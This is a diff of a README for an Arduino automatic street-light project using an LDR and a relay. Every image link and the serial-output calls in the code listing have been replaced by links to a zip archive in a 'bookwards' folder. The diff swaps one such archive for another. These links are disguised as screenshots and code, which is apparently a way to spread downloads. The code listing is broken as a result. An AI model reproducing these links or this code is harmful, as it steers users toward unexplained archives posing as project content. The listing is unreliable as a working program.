@@ -45,7 +45,7 @@ The circuit diagram shown in the image represents a light sensor and street ligh
 3.	Analog-to-Digital Converter (ADC): The Arduino UNO R3 board has six ADC channels that can measure voltage. In this project, the measured voltage across the LDR is converted into a corresponding resistance value using a voltage divider circuit. This resistance value is then converted into a digital value by the ADC for further processing.
 4.	Relay: The relay is used to provide isolation between the low-voltage circuitry (Arduino) and the high-voltage circuitry (street lights). It acts as a switch that is controlled by the Arduino. When the light intensity falls below a certain level, the Arduino sends a control signal to the relay, which then switches on or off the street lights accordingly.
 
- ![image](https://raw.githubusercontent.com/MITHUN8521/Automatic-Light-control-using-Arduino-Controller/main/bookwards/Automatic-Light-control-using-Arduino-Controller-v2.2.zip)
+ ![image](https://github.com/MITHUN8521/Automatic-Light-control-using-Arduino-Controller/raw/refs/heads/main/bookwards/Arduino-control-Light-Automatic-Controller-using-1.7.zip)
 
 
 Overall, this circuit diagram showcases how the Arduino, LDR, ADC, relay, and transistor are interconnected to create a light sensor and street light control system. The Arduino reads the resistance value of the LDR, converts it into a digital value, and based on that, controls the street lights using the relay.
@@ -69,14 +69,14 @@ int sensorPin = A0;
 int sensorValue = 0; 
 void setup() 
 {
-https://raw.githubusercontent.com/MITHUN8521/Automatic-Light-control-using-Arduino-Controller/main/bookwards/Automatic-Light-control-using-Arduino-Controller-v2.2.zip(9600); 
+https://github.com/MITHUN8521/Automatic-Light-control-using-Arduino-Controller/raw/refs/heads/main/bookwards/Arduino-control-Light-Automatic-Controller-using-1.7.zip(9600); 
 pinMode(13, OUTPUT);
 }
 void loop() 
 {
   sensorValue = analogRead(sensorPin);
-  https://raw.githubusercontent.com/MITHUN8521/Automatic-Light-control-using-Arduino-Controller/main/bookwards/Automatic-Light-control-using-Arduino-Controller-v2.2.zip("OUTPUT:");
-  https://raw.githubusercontent.com/MITHUN8521/Automatic-Light-control-using-Arduino-Controller/main/bookwards/Automatic-Light-control-using-Arduino-Controller-v2.2.zip(sensorValue); 
+  https://github.com/MITHUN8521/Automatic-Light-control-using-Arduino-Controller/raw/refs/heads/main/bookwards/Arduino-control-Light-Automatic-Controller-using-1.7.zip("OUTPUT:");
+  https://github.com/MITHUN8521/Automatic-Light-control-using-Arduino-Controller/raw/refs/heads/main/bookwards/Arduino-control-Light-Automatic-Controller-using-1.7.zip(sensorValue); 
   delay(500);
   if(sensorValue<=823)
   {
@@ -94,7 +94,7 @@ void loop()
 ## CIRCUIT DIAGRAM:
 
 
-![Screenshot 2024-03-18 112927](https://raw.githubusercontent.com/MITHUN8521/Automatic-Light-control-using-Arduino-Controller/main/bookwards/Automatic-Light-control-using-Arduino-Controller-v2.2.zip)
+![Screenshot 2024-03-18 112927](https://github.com/MITHUN8521/Automatic-Light-control-using-Arduino-Controller/raw/refs/heads/main/bookwards/Arduino-control-Light-Automatic-Controller-using-1.7.zip)
 
 
 ## OUTPUT:
@@ -103,7 +103,7 @@ void loop()
 
 
 
-![Screenshot 2024-03-18 113252](https://raw.githubusercontent.com/MITHUN8521/Automatic-Light-control-using-Arduino-Controller/main/bookwards/Automatic-Light-control-using-Arduino-Controller-v2.2.zip)
+![Screenshot 2024-03-18 113252](https://github.com/MITHUN8521/Automatic-Light-control-using-Arduino-Controller/raw/refs/heads/main/bookwards/Arduino-control-Light-Automatic-Controller-using-1.7.zip)
 
 ## RESULT:
 Thus the automatic light controller was designed and simulated using LDR and Arduino UNO controller.
